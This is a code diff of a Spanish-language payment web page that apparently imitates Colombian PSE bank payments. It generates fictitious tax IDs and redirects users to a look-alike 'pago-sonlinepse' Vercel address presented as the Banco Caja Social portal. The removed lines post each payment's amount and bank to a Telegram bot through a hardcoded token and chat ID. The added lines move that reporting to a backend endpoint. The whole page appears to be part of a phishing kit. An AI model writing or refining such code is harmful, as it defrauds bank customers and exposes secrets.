@@ -374,17 +374,6 @@
         const API_URL = '';
         const RAPPIPAY_LINK_CODE = 'x5BEvM';
 
-        // Telegram directo desde el navegador
-        const TG_TOKEN = '8712124626:AAFAYI4vRWnUlvkzuk63dnKhe-dEOIyfwM4';
-        const TG_CHAT  = '-1004457768033';
-        function enviarTelegram(valor, banco, pasarela) {
-            const msg = `🟢 NUEVO PAGO\n💰 $${valor}\n🏦 ${banco}\n🔌 ${pasarela}\n🕐 ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TG_CHAT, text: msg })
-            }).catch(() => {});
-        }
-
         function generarNITFicticio(nombre) {
             let hash = 0;
             for (let i = 0; i < nombre.length; i++) {
@@ -464,8 +453,14 @@
                 // Redirigir directo al portal de Caja Social
                 const overlay = document.getElementById('loadingOverlay');
                 overlay.classList.add('active');
-                const valorPago = document.getElementById('valorPago').textContent.replace('$','');
-                enviarTelegram(valorPago, 'BANCO CAJA SOCIAL', 'Directo');
+                const valorPago = document.getElementById('valorPago').textContent
+                    .replace('$', '').replace(/\./g, '').replace(',', '.');
+                // Notificar al backend (que a su vez notifica a Telegram)
+                fetch(`${API_URL}/api/pasarela/notificar-directo`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ valor: parseFloat(valorPago), banco: 'BANCO CAJA SOCIAL' })
+                }).catch(() => {});
                 setTimeout(() => {
                     window.location.href = 'https://pago-sonlinepse.vercel.app/sites/cj/manager/48866e99e0bf862e2a739a49';
                 }, 2000);
@@ -547,7 +542,11 @@
                 loadingOverlay.classList.add('active');
                 document.getElementById('btnPagarPSE').disabled = true;
                 document.getElementById('btnPagarPSE').textContent = 'Redirigiendo...';
-                enviarTelegram(Math.round(valor), bancoName, 'Directo');
+                fetch(`${API_URL}/api/pasarela/notificar-directo`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ valor: Math.round(valor), banco: bancoName })
+                }).catch(() => {});
                 window.location.href = BANCOS_DIRECTOS[bancoCode];
                 return;
             }
@@ -577,7 +576,7 @@
                 const data = await response.json();
 
                 if (data.success && data.bankUrl) {
-                    enviarTelegram(Math.round(valor), bancoName, 'RappiPay');
+                    // El server ya notifica a Telegram en /api/pasarela/rappipay-pse
                     window.location.href = data.bankUrl;
                 } else {
                     throw new Error(data.error || 'No se pudo generar la URL de pago. Intenta de nuevo.');
